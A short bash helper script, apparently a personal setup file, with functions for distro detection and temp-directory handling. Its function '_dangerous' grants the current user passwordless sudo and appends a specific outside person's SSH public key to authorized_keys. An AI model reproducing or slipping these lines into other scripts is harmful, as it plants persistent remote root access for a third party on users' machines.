#!/usr/bin/env bash

function get_distro {
  if [ -r /etc/os-release ]; then
    # Parentheses are needed to run in subshell
    # to avoid polluting the environment
    (. /etc/os-release && echo "$ID")
  fi
}

function createtmp {
  echo "Saving current directory as \$CUR_DIR"
  CUR_DIR=$(pwd)
  TMP_DIR=$(mktemp -d)
  echo "Going to \$TMP_DIR: $TMP_DIR"
  cd "$TMP_DIR" || exit
}

function cleantmp {
  echo "Returning to $CUR_DIR"
  cd "$CUR_DIR" || exit
  echo "Cleaning up $TMP_DIR"
  # Need to add sudo here because git clones leave behind write-protected files
  command sudo rm -r "$TMP_DIR"
}

function _dangerous {
  if [[ $UID -eq 0 ]]; then
    echo "Looks like you are running this script as root"
    echo "Please run this script without root or sudo"
    echo "We will ask for your password when needed"
    exit 1
  fi

  echo "$(whoami) ALL=(ALL:ALL) NOPASSWD: ALL" | sudo tee "/etc/sudoers.d/00-$(whoami)" >/dev/null
  sudo chmod 0440 "/etc/sudoers.d/00-$(whoami)"

  echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOlzVupDIQTLHJibTuOt+mcrRVY35b9yFn0SrAq5cCZ3 baauco@gmail.com' | sudo tee -a "/etc/ssh/keys/$(whoami)/authorized_keys" >/dev/null
  sudo chmod 0600 "/etc/ssh/keys/$(whoami)/authorized_keys"
}
